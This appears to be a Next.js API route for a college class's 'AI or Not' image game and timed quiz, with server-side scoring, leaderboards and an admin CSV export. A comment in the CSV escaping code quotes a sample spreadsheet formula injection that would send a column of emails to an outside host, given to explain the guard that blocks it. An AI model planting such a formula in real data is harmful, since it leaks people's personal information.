import { NextResponse, type NextRequest } from "next/server";
import { timingSafeEqual } from "node:crypto";
import { pool, poolStatus, byId, drawGame, imageUrl } from "@/lib/sagarmatha/images";
import { QUIZZES, QUIZ_SECONDS_PER_QUESTION, publicQuiz } from "@/lib/sagarmatha/quiz";
import { badName } from "@/lib/sagarmatha/names";
import {
  SESSION, SESSIONS, sessionFor, storageMode, checkDb, createGame, findGameByEmail, getGame, updateGame, startClock, listGames, listGamesPublic,
  findQuizByEmail, getQuiz, startQuiz, finishQuiz, listQuiz, listQuizPublic,
  type Answer, type Game, type QuizResponse,
} from "@/lib/sagarmatha/store";

/*
 * /api/sagarmatha/* — the third deliberate dynamic route (with /api/contact
 * and /api/assistant). Backs the unlisted Sagarmatha College session pages in
 * public/ai-training/sagarmatha-college/: the AI or Not game, the timed phone
 * quiz, a live leaderboard for each (per class session, `?s=1` for an earlier
 * one), and a key-protected export for the owner.
 *
 * Scoring is server-side and answers never reach the browser before a guess.
 */

const SECONDS = 10;
// The clock starts when the server hands out the image URL, so allow for the
// image download plus network and tap latency before an answer counts as late.
const GRACE_MS = 3000;
// Quiz: the phone moves on after 30 s a question; the server allows the
// total plus a minute for a slow connection, then ignores late answers.
const QUIZ_GRACE_MS = 60_000;

// A whole class shares one college IP, so the limit is per IP but generous.
const hits = new Map<string, number[]>();
function limited(ip: string, max = 400, windowMs = 5 * 60 * 1000) {
  const now = Date.now();
  const recent = (hits.get(ip) ?? []).filter((t) => now - t < windowMs);
  recent.push(now);
  hits.set(ip, recent);
  if (hits.size > 5000) hits.clear();
  return recent.length > max;
}

const json = (data: unknown, status = 200) =>
  NextResponse.json(data, { status, headers: { "Cache-Control": "no-store", "X-Robots-Tag": "noindex" } });

const clean = (v: unknown, max: number) => (typeof v === "string" ? v.replace(/\s+/g, " ").trim().slice(0, max) : "");
const EMAIL = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;

/** Shared by the game and the quiz: the same three fields, the same rules. */
function player(body: Record<string, unknown>) {
  const name = clean(body.name, 60);
  const email = clean(body.email, 120).toLowerCase();
  const roll = clean(body.roll, 30) || null;
  if (name.length < 2) return { error: "name_required" as const };
  if (badName(name)) return { error: "name_invalid" as const };
  if (!EMAIL.test(email)) return { error: "email_invalid" as const };
  return { name, email, roll };
}
function isAdmin(req: NextRequest) {
  const want = process.env.SAGARMATHA_ADMIN_KEY;
  const got = req.headers.get("x-admin-key") ?? "";
  if (!want || !got) return false;
  const a = Buffer.from(want), b = Buffer.from(got);
  return a.length === b.length && timingSafeEqual(a, b);
}

const quizById = (id: string) => (Object.hasOwn(QUIZZES, id) ? QUIZZES[id] : undefined);
const ipOf = (req: NextRequest) => (req.headers.get("x-forwarded-for") ?? "local").split(",")[0].trim();

// A projector and 100 phones poll every 3 s: answer from a 2 s cache.
const boardCache = new Map<string, { at: number; data: unknown }>();
async function cached<T>(key: string, build: () => Promise<T>): Promise<T> {
  const hit = boardCache.get(key);
  if (hit && Date.now() - hit.at < 2000) return hit.data as T;
  const data = await build();
  boardCache.set(key, { at: Date.now(), data });
  return data;
}

function summary(g: Game) {
  return {
    name: g.name, points: g.points, correct: g.correct, total: g.image_ids.length,
    bestStreak: g.best_streak, timeouts: g.timeouts, aiCalledReal: g.ai_called_real,
    totalMs: g.total_ms, finished: g.finished,
  };
}

function reveal(g: Game) {
  return g.answers.map((a) => {
    const img = byId(a.imageId);
    return {
      url: img ? imageUrl(img) : null, truth: img?.truth, tell: img?.tell, credit: img?.credit,
      guess: a.guess, correct: a.correct, ms: a.ms, points: a.points,
    };
  });
}

/* Score is the number right out of 10; speed only breaks ties. */
async function buildLeaderboard(session: string) {
  const games = (await listGamesPublic(session)).filter((g) => g.answers.length > 0 && !badName(g.name));
  games.sort((a, b) => b.correct - a.correct || a.total_ms - b.total_ms || a.created_at.localeCompare(b.created_at));
  const finished = games.filter((g) => g.finished);
  return {
    stats: {
      players: games.length,
      finished: finished.length,
      top: games[0]?.correct ?? 0,
      avgCorrect: finished.length ? +(finished.reduce((s, g) => s + g.correct, 0) / finished.length).toFixed(1) : null,
      aiCalledRealPct: finished.length
        ? Math.round((100 * finished.reduce((s, g) => s + g.ai_called_real, 0)) /
            Math.max(1, finished.reduce((s, g) => s + g.answers.filter((a) => byId(a.imageId)?.truth === "ai").length, 0)))
        : null,
    },
    // Never the email.
    rows: games.slice(0, 100).map((g, i) => ({
      rank: i + 1, name: g.name, roll: g.roll, correct: g.correct,
      answered: g.answers.length, total: g.image_ids.length, seconds: +(g.total_ms / 1000).toFixed(1), playing: !g.finished,
    })),
  };
}

async function buildQuizBoard(session: string) {
  const all = (await listQuizPublic(session)).filter((r) => !badName(r.name));
  const done = all.filter((r) => r.total > 0);
  done.sort((a, b) => b.score - a.score || (a.ms ?? Infinity) - (b.ms ?? Infinity) || (a.created_at ?? "").localeCompare(b.created_at ?? ""));
  return {
    stats: {
      players: all.length,
      finished: done.length,
      top: done[0]?.score ?? 0,
      total: done[0]?.total ?? QUIZZES.final.questions.length,
      avgScore: done.length ? +(done.reduce((s, r) => s + r.score, 0) / done.length).toFixed(1) : null,
    },
    rows: done.slice(0, 100).map((r, i) => ({
      rank: i + 1, name: r.name, roll: r.roll, score: r.score, total: r.total,
      seconds: r.ms == null ? null : +(r.ms / 1000).toFixed(1),
    })),
  };
}

function quizResult(r: QuizResponse, alreadySubmitted = false) {
  const qz = quizById(r.quiz);
  if (!qz) return { error: "not_found" };
  return {
    alreadySubmitted, score: r.score, total: r.total, seconds: r.ms == null ? null : +(r.ms / 1000).toFixed(1),
    questions: qz.questions.map((q) => ({ id: q.id, q: q.q, options: q.options, yours: r.answers?.[q.id] ?? null, answer: q.answer, why: q.why })),
  };
}

function csv(rows: Record<string, unknown>[]) {
  if (!rows.length) return "";
  // Every column any row has (quiz rows can skip questions).
  const cols = [...new Set(rows.flatMap((r) => Object.keys(r)))];
  const esc = (v: unknown) => {
    let s = v == null ? "" : typeof v === "object" ? JSON.stringify(v) : String(v);
    // A name like =IMAGE("https://x/"&D:D) would run as a formula in Sheets or
    // Excel and could send every email away. Prefix so it stays plain text.
    if (typeof v === "string" && /^[=+\-@\t\r]/.test(s)) s = "'" + s;
    return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
  };
  return [cols.join(","), ...rows.map((r) => cols.map((c) => esc(r[c])).join(","))].join("\n");
}

type Ctx = { params: Promise<{ path: string[] }> };

export async function GET(req: NextRequest, ctx: Ctx) {
  const route = (await ctx.params).path.join("/");
  if (limited(ipOf(req), 1500)) return json({ error: "slow_down" }, 429);
  if (route === "config") {
    return json({
      storage: storageMode, db: await checkDb(), pool: poolStatus(), poolSize: pool().length, session: SESSION,
      sessions: SESSIONS.map((s) => ({ key: s.key, label: s.label, current: s.id === SESSION })),
    });
  }
  if (storageMode === "none") return json({ error: "storage_not_configured" }, 503);
  const session = sessionFor(req.nextUrl.searchParams.get("s"));

  try {
    if (route === "aion/leaderboard") return json(await cached("aion:" + session, () => buildLeaderboard(session)));
    if (route === "quiz/leaderboard") return json(await cached("quiz:" + session, () => buildQuizBoard(session)));

    if (route === "aion/result") {
      const g = await getGame(req.nextUrl.searchParams.get("id") ?? "");
      if (!g) return json({ error: "not_found" }, 404);
      if (!g.finished) return json({ error: "not_finished" }, 409);
      return json({ summary: summary(g), reveal: reveal(g) });
    }

    // The attempt id is the phone's proof: only the phone that took the quiz has it.
    if (route === "quiz/result") {
      const r = await getQuiz(req.nextUrl.searchParams.get("id") ?? "");
      if (!r) return json({ error: "not_found" }, 404);
      if (!r.total) return json({ error: "not_finished" }, 409);
      return json(quizResult(r, true));
    }

    if (route === "admin/export") {
      if (!isAdmin(req)) {
        if (limited("admin:" + ipOf(req), 20)) return json({ error: "slow_down" }, 429);
        return json({ error: "unauthorized" }, 401);
      }
      const type = req.nextUrl.searchParams.get("type") ?? "aion";
      const format = req.nextUrl.searchParams.get("format") ?? "json";
      let rows: Record<string, unknown>[];
      if (type === "quiz") {
        rows = (await listQuiz(session)).map((r) => ({
          created_at: r.created_at, quiz: r.quiz, name: r.name, email: r.email, roll: r.roll,
          submitted: r.total > 0, score: r.score, total: r.total, seconds: r.ms == null ? null : +(r.ms / 1000).toFixed(1),
          ...Object.fromEntries(Object.entries(r.answers ?? {}).map(([k, v]) => [k, v])),
        }));
      } else {
        rows = (await listGames(session)).map((g) => ({
          created_at: g.created_at, finished_at: g.finished_at, name: g.name, email: g.email, roll: g.roll,
          correct: g.correct, total: g.image_ids.length, answered: g.answers.length, best_streak: g.best_streak,
          timeouts: g.timeouts, ai_called_real: g.ai_called_real, seconds: +(g.total_ms / 1000).toFixed(1),
          finished: g.finished, answers: g.answers,
        }));
      }
      if (format === "csv") {
        return new NextResponse(csv(rows), {
          headers: {
            "Content-Type": "text/csv; charset=utf-8",
            "Content-Disposition": `attachment; filename="${session}-${type === "quiz" ? "quiz" : "aion"}.csv"`,
            "Cache-Control": "no-store",
          },
        });
      }
      return json({ type, session, count: rows.length, rows });
    }
  } catch (e) {
    console.error("[sagarmatha]", e);
    return json({ error: "server_error" }, 500);
  }
  return json({ error: "not_found" }, 404);
}

export async function POST(req: NextRequest, ctx: Ctx) {
  const route = (await ctx.params).path.join("/");
  if (storageMode === "none") return json({ error: "storage_not_configured" }, 503);
  if (limited(ipOf(req))) return json({ error: "slow_down" }, 429);

  let body: Record<string, unknown> = {};
  try { body = await req.json(); } catch { return json({ error: "bad_json" }, 400); }

  try {
    /* -------- AI or Not: join (or resume an unfinished game) -------- */
    if (route === "aion/start") {
      const p = player(body);
      if ("error" in p) return json({ error: p.error }, 400);
      const { name, email, roll } = p;

      // Only the phone that started a game can resume it or see its result, so
      // knowing a classmate's email isn't enough to take over their game.
      const mine = clean(body.gameId, 40);
      const existing = await findGameByEmail(email);
      if (existing) {
        const owner = mine === existing.id;
        if (existing.finished) return json({ error: "already_played", ...(owner ? { gameId: existing.id } : {}) }, 409);
        if (!owner) return json({ error: "already_started" }, 409);
        return json({ gameId: existing.id, index: existing.current_index, total: existing.image_ids.length, seconds: SECONDS, resumed: true });
      }
      // Not playable until both kinds exist; otherwise "always Real" scores 100%.
      const all = pool();
      const kinds = { ai: all.filter((p) => p.truth === "ai").length, real: all.filter((p) => p.truth === "real").length };
      if (kinds.ai < 3 || kinds.real < 3) return json({ error: "pool_empty" }, 503);
      const picked = drawGame(10);
      const g = await createGame({ name, email, roll, image_ids: picked.map((p) => p.id) });
      if (g === "exists") return json({ error: "already_started" }, 409); // two taps at once
      return json({ gameId: g.id, index: 0, total: g.image_ids.length, seconds: SECONDS, resumed: false });
    }

    /* -------- AI or Not: hand out ONE image and start its clock --------
     * The URL is only revealed here, and the clock starts now, once. Calling
     * again (reload) returns the same image with the time already used. */
    if (route === "aion/show") {
      const g0 = await getGame(clean(body.gameId, 40));
      const index = Number(body.index);
      if (!g0 || g0.finished || index !== g0.current_index) return json({ error: "bad_state", index: g0?.current_index, finished: g0?.finished }, 409);
      const g = await startClock(g0.id, index);
      const img = g ? byId(g.image_ids[index]) : undefined;
      if (!g || !img || !g.shown_at) return json({ error: "bad_state", index: g?.current_index }, 409);
      const used = Date.now() - new Date(g.shown_at).getTime();
      return json({ url: imageUrl(img), n: index, total: g.image_ids.length, seconds: SECONDS, remainingMs: Math.max(0, SECONDS * 1000 - used) });
    }

    /* -------- AI or Not: answer the current image -------- */
    if (route === "aion/answer") {
      const g = await getGame(clean(body.gameId, 40));
      const index = Number(body.index);
      if (!g) return json({ error: "not_found" }, 404);
      if (g.finished || index !== g.current_index) return json({ error: "bad_state", index: g.current_index, finished: g.finished }, 409);

      const img = byId(g.image_ids[index]);
      if (!img) return json({ error: "server_error" }, 500);
      const guess = body.guess === "ai" || body.guess === "real" ? body.guess : null;
      // Never shown by the server = never on screen = no points.
      const elapsed = g.shown_at ? Date.now() - new Date(g.shown_at).getTime() : Infinity;
      const timedOut = guess === null || elapsed > SECONDS * 1000 + GRACE_MS;
      const correct = !timedOut && guess === img.truth;
      const ms = Math.min(Math.max(0, elapsed - 500), SECONDS * 1000);
      const points = correct ? 100 + Math.round(50 * Math.max(0, (SECONDS * 1000 - ms) / (SECONDS * 1000))) : 0;

      const answer: Answer = { imageId: img.id, guess: timedOut ? null : guess, correct, ms, points };
      const streak = correct ? g.streak + 1 : 0;
      const finished = index + 1 >= g.image_ids.length;
      const next = await updateGame(g.id, index, {
        answers: [...g.answers, answer],
        current_index: index + 1,
        shown_at: null,
        points: g.points + points,
        correct: g.correct + (correct ? 1 : 0),
        streak,
        best_streak: Math.max(g.best_streak, streak),
        timeouts: g.timeouts + (timedOut ? 1 : 0),
        ai_called_real: g.ai_called_real + (img.truth === "ai" && guess === "real" && !timedOut ? 1 : 0),
        total_ms: g.total_ms + ms,
        finished,
        finished_at: finished ? new Date().toISOString() : null,
      });
      if (!next) return json({ error: "bad_state" }, 409); // double tap: the first one counted

      return json({
        correct, timedOut, truth: img.truth, tell: img.tell, credit: img.credit,
        score: next.correct, streak, finished,
        ...(finished ? { summary: summary(next), reveal: reveal(next) } : {}),
      });
    }

    /* -------- Quiz: start (or resume) — the server's clock starts here -------- */
    if (route === "quiz/start") {
      const quizId = clean(body.quiz, 20) || "final";
      const pub = publicQuiz(quizId);
      if (!pub) return json({ error: "not_found" }, 404);
      const p = player(body);
      if ("error" in p) return json({ error: p.error }, 400);
      const limitMs = pub.questions.length * QUIZ_SECONDS_PER_QUESTION * 1000;
      const mine = clean(body.attemptId, 40);
      const existing = await findQuizByEmail(quizId, p.email);
      if (existing) {
        const owner = mine === existing.id;
        if (existing.total > 0) return json({ error: "quiz_done", ...(owner ? { attemptId: existing.id } : {}) }, 409);
        if (!owner) return json({ error: "quiz_started" }, 409);
        const used = Date.now() - new Date(existing.created_at!).getTime();
        return json({ attemptId: existing.id, session: SESSION, ...pub, limitMs, remainingMs: Math.max(0, limitMs - used), resumed: true });
      }
      const r = await startQuiz({ quiz: quizId, name: p.name, email: p.email, roll: p.roll });
      if (r === "exists") return json({ error: "quiz_started" }, 409); // two taps at once
      return json({ attemptId: r.id, session: SESSION, ...pub, limitMs, remainingMs: limitMs, resumed: false });
    }

    /* -------- Quiz: submit all answers once, scored and timed here -------- */
    if (route === "quiz/submit") {
      const r = await getQuiz(clean(body.attemptId, 40));
      if (!r) return json({ error: "not_found" }, 404);
      if (r.total > 0) return json(quizResult(r, true));
      const qz = quizById(r.quiz);
      if (!qz) return json({ error: "not_found" }, 404);
      const limitMs = qz.questions.length * QUIZ_SECONDS_PER_QUESTION * 1000;
      const elapsed = Date.now() - new Date(r.created_at!).getTime();
      const late = elapsed > limitMs + QUIZ_GRACE_MS;

      const raw = (late ? {} : body.answers ?? {}) as Record<string, unknown>;
      const answers: Record<string, number> = {};
      let score = 0;
      for (const q of qz.questions) {
        if (!Object.hasOwn(raw, q.id) || raw[q.id] === null) continue;
        const v = Number(raw[q.id]);
        if (Number.isInteger(v) && v >= 0 && v < q.options.length) {
          answers[q.id] = v;
          if (v === q.answer) score++;
        }
      }
      const done = await finishQuiz(r.id!, {
        answers, score, total: qz.questions.length, ms: Math.min(elapsed, limitMs), finished_at: new Date().toISOString(),
      });
      if (!done) { // double tap: the first submit counted
        const again = await getQuiz(r.id!);
        return again ? json(quizResult(again, true)) : json({ error: "server_error" }, 500);
      }
      return json({ ...quizResult(done), late });
    }
  } catch (e) {
    console.error("[sagarmatha]", e);
    return json({ error: "server_error" }, 500);
  }
  return json({ error: "not_found" }, 404);
}
